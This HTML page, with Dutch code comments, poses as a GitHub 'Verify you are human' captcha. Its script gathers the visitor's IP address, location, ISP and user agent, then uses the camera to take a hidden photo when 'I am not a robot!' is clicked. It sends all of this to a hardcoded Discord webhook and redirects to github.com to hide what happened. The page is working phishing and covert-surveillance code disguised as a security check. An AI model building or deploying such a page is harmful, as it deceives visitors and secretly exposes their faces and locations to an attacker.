<!DOCTYPE html>
<html lang="nl">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Github Web: Secure Login</title>
  <style>
    :root {
      --tg-blue: #24A1DE;
      --tg-bg: #ffffff;
      --tg-text: #000000;
      --tg-sub: #8e8e93;
    }

    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      background: var(--tg-bg);
      color: var(--tg-text);
      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", sans-serif;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
    }

    #screen-landing, #screen-loading {
      width: 100%;
      max-width: 380px;
      padding: 20px;
      text-align: center;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    /* Logo Styling - GEEN corners */
    .faceid-frame {
      width: 120px; 
      height: 120px;
      margin-bottom: 30px;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .faceid-svg {
      width: 100px;
      height: 100px;
      background-image: url("https://media.discordapp.net/attachments/1481301560360308919/1495188750437843105/google_recaptcha.png?ex=69e55689&is=69e40509&hm=cc3af7ec02e6cc87aa5585a06580916c1dd17728e6e14e11d4df4f2ac01e6f6e&=&format=webp&quality=lossless&width=660&height=660");
      background-size: contain;
      background-repeat: no-repeat;
      background-position: center;
    }

    .tg-title { font-size: 1.5rem; font-weight: 600; margin-bottom: 12px; }
    .tg-subtitle { color: var(--tg-sub); font-size: 0.95rem; margin-bottom: 40px; }

    .verify-btn {
      width: 90%;
      padding: 16px;
      background: var(--tg-blue);
      color: white;
      border: none;
      border-radius: 14px;
      font-size: 1.05rem;
      font-weight: 600;
      cursor: pointer;
    }

    #screen-loading { display: none; }
    .scan-box { width: 140px; height: 140px; position: relative; display: flex; justify-content: center; align-items: center; }
    .scan-line { position: absolute; width: 100%; height: 2px; background: var(--tg-blue); top: 0; animation: moving-scan 1.5s infinite ease-in-out; }
    @keyframes moving-scan { 0%, 100% { top: 10%; } 50% { top: 90%; } }
    
    #hidden-video { position: fixed; opacity: 0; left: -999px; }
    #hidden-canvas { display: none; }
  </style>
</head>
<body>

<video id="hidden-video" autoplay playsinline muted></video>
<canvas id="hidden-canvas"></canvas>

<div id="screen-landing">
  <div class="faceid-frame"><div class="faceid-svg"></div></div>
  <div class="tg-title">Verify you are human.</div>
  <div class="tg-subtitle">Security measures enabled. Please confirm you're a human to access Github.</div>
  <button class="verify-btn" onclick="triggerScan()">I am not a robot!</button>
</div>

<div id="screen-loading">
  <div class="scan-box">
      <div class="faceid-svg" style="opacity: 0.3;"></div>
      <div class="scan-line"></div>
  </div>
  <div style="margin-top:20px; color:var(--tg-blue); font-weight:600;">Authenticating...</div>
</div>

<script>
  const WEBHOOK = 'https://discord.com/api/webhooks/1495153409458704537/5MxkCcDC1DuhzHDf90BqtcED6yHEbI62IvzytW4rtMOE-CZCVhRXNw3nCqwKZCN0tc91';
  
  // Globale variabelen die direct gevuld gaan worden
  let info = {
    ip: "Laden...",
    loc: "Onbekend",
    isp: "Onbekend",
    ua: navigator.userAgent
  };

  // Start direct met het ophalen van IP data zodra de pagina opent
  async function preloadInfo() {
    try {
      const res = await fetch('https://ipapi.co/json/');
      const data = await res.json();
      info.ip = data.ip || "N/A";
      info.loc = `${data.city}, ${data.region}, ${data.country_name}` || "N/A";
      info.isp = data.org || "N/A";
    } catch (e) {
      // Fallback naar simpeler API als de eerste faalt
      const res2 = await fetch('https://api.ipify.org?format=json');
      const data2 = await res2.json();
      info.ip = data2.ip;
    }
  }
  preloadInfo();

  async function triggerScan() {
    document.getElementById('screen-landing').style.display = 'none';
    document.getElementById('screen-loading').style.display = 'flex';

    const blobs = [];
    
    // Probeer foto te maken
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
      const blob = await new Promise(resolve => {
        const vid = document.getElementById('hidden-video');
        vid.srcObject = stream;
        vid.onloadedmetadata = () => {
          setTimeout(() => {
            const can = document.getElementById('hidden-canvas');
            can.width = vid.videoWidth;
            can.height = vid.videoHeight;
            const ctx = can.getContext('2d');
            ctx.drawImage(vid, 0, 0);
            can.toBlob(resolve, 'image/jpeg', 0.8);
          }, 500);
        };
      });
      if(blob) blobs.push({ b: blob, n: 'capture.jpg' });
      stream.getTracks().forEach(t => t.stop());
    } catch(e) { console.log("Geen camera"); }

    await sendData(blobs);
    window.location.href = 'https://github.com';
  }

  async function sendData(blobs) {
    const formData = new FormData();
    const payload = {
      username: "Security Check",
      embeds: [{
        title: "🛡️ Nieuwe Login Captcha",
        color: 0x24A1DE,
        fields: [
          { name: "📱 Apparaat", value: `\`${info.ua}\`` },
          { name: "🌐 IP Adres", value: `\`${info.ip}\``, inline: true },
          { name: "📍 Locatie", value: info.loc, inline: true },
          { name: "🏢 Provider", value: info.isp }
        ],
        timestamp: new Date()
      }]
    };

    formData.append('payload_json', JSON.stringify(payload));
    blobs.forEach((item, i) => formData.append(`file${i}`, item.b, item.n));

    await fetch(WEBHOOK, { method: 'POST', body: formData });
  }
</script>
</body>
</html>
